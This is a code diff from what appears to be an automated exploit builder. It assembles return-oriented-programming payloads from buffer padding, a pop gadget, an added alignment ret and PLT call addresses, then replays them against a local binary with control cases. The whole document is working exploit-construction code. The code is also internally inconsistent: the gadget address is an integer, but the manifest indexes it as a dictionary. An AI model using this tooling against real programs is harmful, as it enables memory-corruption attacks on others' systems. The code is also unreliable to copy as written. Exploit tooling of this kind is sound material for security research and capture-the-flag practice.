@@ -155,9 +155,11 @@ def _candidate(binary, offset, calls, deadline):
         if len(gadgets) != 1:
             raise ValueError("exact three-pop return gadget is absent or ambiguous")
     gadget = gadgets[0]["address"]
+    alignment_ret = gadget + 3
     def word(value):
         return value.to_bytes(8, "little")
-    links = [word(gadget) + b"".join(word(value) for value in row["args"]) +
+    links = [word(alignment_ret) + word(gadget) +
+             b"".join(word(value) for value in row["args"]) +
              word(entries[row["symbol"]]["plt_address"]) for row in calls]
     payload = b"A" * offset + b"".join(links)
     if len(payload) > 512:
@@ -188,7 +190,7 @@ def _render(run, manifest, current):
 
 
 def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
-          runs_root=None, replay_local=False):
+          runs_root=None, replay_local=False, resource_files=None):
     if (not isinstance(budget, (int, float)) or isinstance(budget, bool) or
             not 0 < budget <= 120):
         raise ValueError("call-chain budget must be positive and at most 120 seconds")
@@ -198,8 +200,11 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
         raise ValueError("success marker and prompt delimiter overlap ambiguously")
     deadline = time.monotonic() + budget
     binary, digest = pwn._source(binary_path, deadline)
+    if resource_files and not replay_local:
+        raise ValueError("resource files require explicit local replay")
     offset, library_path = pwn._offset_evidence(offset_run, binary, digest, deadline)
     spec_path, spec_hash, calls = _spec(calls_json, deadline)
+    resources = pwn._resources(resource_files, binary, deadline)
     if replay_local and not os.access(binary, os.X_OK):
         raise ValueError("local replay needs an executable binary")
     try:
@@ -225,7 +230,8 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
         except ValueError:
             offset_ok = False
         loader = pwn._loader_current(library, env_path, env_hash, libraries, deadline)
-        return source is True and spec and offset_ok and loader is True
+        return (source is True and spec and offset_ok and loader is True and
+                pwn._resources_current(resources, deadline))
 
     if not identities():
         raise ValueError("source, call specification, offset or library identity changed during construction")
@@ -241,20 +247,20 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
             if library is not None else [str(binary)])
     blocks = b"".join((links[1], links[0], links[2]))
     wrong_arg = bytearray(payload)
-    wrong_arg[offset + 8] ^= 1
+    wrong_arg[offset + 16] ^= 1
     cases = (("short", b"B\n"), ("wrong-offset", payload[1:]),
              ("wrong-order", b"A" * offset + blocks),
              ("wrong-argument", bytes(wrong_arg)))
     controls = []
 
-    def execute(data, timeout):
+    def execute(data, timeout, cwd):
         return run_service(
-            {"transport": {"argv": argv, "cwd": str(binary.parent)},
+            {"transport": {"argv": argv, "cwd": str(cwd)},
              "steps": [{"read": {"delimiter_hex": prompt.hex()}},
                        {"write_hex": data.hex()},
                        {"read": {"delimiter_hex": marker.hex()}}]},
             timeout=timeout, max_bytes=65536, max_frame_bytes=16384,
-            max_steps=3, allow_local=True)
+            max_steps=3, allow_local=True, local_env=pwn._replay_env(cwd))
 
     operation = None
     if replay_local:
@@ -266,7 +272,17 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
             if remaining <= 0:
                 controls.append({"name": name, "status": "inconclusive", "error": "budget"})
                 continue
-            control, extra = execute(data, min(2, remaining / 5))
+            try:
+                cwd = pwn._staged_cwd(run, name, resources, deadline)
+            except ValueError:
+                controls.append({"name": name, "status": "inconclusive", "error": "staging"})
+                warnings.append("private resource staging incomplete before " + name + " control")
+                continue
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                controls.append({"name": name, "status": "inconclusive", "error": "budget"})
+                continue
+            control, extra = execute(data, min(2, remaining / 5), cwd)
             transcript = control["transcript"]
             sent = next((i for i, row in enumerate(transcript) if row["direction"] == "send"),
                         len(transcript))
@@ -279,16 +295,26 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
                       control["bytes_sent"] == len(data) else "inconclusive")
             if status != "marker absent":
                 warnings.extend(extra)
-            if not identities():
+            if not identities() or not pwn._copied_resources_current(cwd, resources, deadline):
                 status = "inconclusive"
                 warnings.append("identity changed after " + name + " control")
-            controls.append({"name": name, "status": status, "error": control["error"]})
+            controls.append({"name": name, "status": status, "attempted": True,
+                             "error": control["error"]})
             core._write_json(run / f"control-{name}-frames.json", control["frames"])
             core._write_text(run / f"control-{name}-transcript.jsonl", "".join(
                 json.dumps(row, sort_keys=True) + "\n" for row in transcript))
         if identities() and deadline - time.monotonic() > 0:
-            operation, extra = execute(payload, deadline - time.monotonic())
-            warnings.extend(extra)
+            try:
+                cwd = pwn._staged_cwd(run, "candidate", resources, deadline)
+            except ValueError:
+                warnings.append("private resource staging incomplete before candidate replay")
+            else:
+                remaining = deadline - time.monotonic()
+                if remaining > 0:
+                    operation, extra = execute(payload, remaining, cwd)
+                    warnings.extend(extra)
+                else:
+                    warnings.append("budget ended during candidate resource staging")
         else:
             warnings.append("identity or budget prevented candidate replay")
     validation = "candidate" if not replay_local else "unverified"
@@ -307,6 +333,7 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
             warnings.append("success marker appeared before candidate write")
         if (operation["status"] == "complete" and operation["bytes_sent"] == len(payload)
                 and marker in post and marker not in pre and identities() and
+                pwn._copied_resources_current(cwd, resources, deadline) and
                 all(row["status"] == "marker absent" for row in controls) and
                 len(controls) == 4 and replay_error != "loader_failure"):
             validation = "local marker observed with controls"
@@ -320,6 +347,8 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
                 "calls_json": str(spec_path), "calls_sha256": spec_hash, "calls": calls,
                 "payload_sha256": hashlib.sha256(payload).hexdigest(),
                 "gadget": gadget, "plt_entries": entries,
+                "alignment_ret_address": gadget["address"] + 3,
+                "resources": resources,
                 "architecture": report["architecture"], "mitigations": report["mitigations"],
                 "library_path": str(library) if library is not None else None,
                 "env_tool_path": str(env_path) if env_path is not None else None,
@@ -330,7 +359,8 @@ def start(binary_path, offset_run, calls_json, prompt_hex, success_hex, budget,
                                       "local marker observed with controls" else "partial",
                                       "note": "verified imported x64 PLT calls, local only"}}}
     core._write_json(run / "manifest.json", manifest)
-    _render(run, manifest, identities())
+    _render(run, manifest, identities() and pwn._run_copies_current(
+        run, resources, controls, operation is not None, deadline))
     return run, "partial"
 
 
@@ -360,6 +390,11 @@ def resume(run_path):
                                       Path(manifest["env_tool_path"]),
                                       manifest["env_tool_sha256"],
                                       manifest["libraries"], deadline) is True
+    if current:
+        current = (pwn._resources_current(manifest["resources"], deadline) and
+                   pwn._run_copies_current(run, manifest["resources"],
+                                           manifest["controls"],
+                                           manifest["replay_attempted"], deadline))
     _render(run, manifest, current)
     return run, "partial"
 
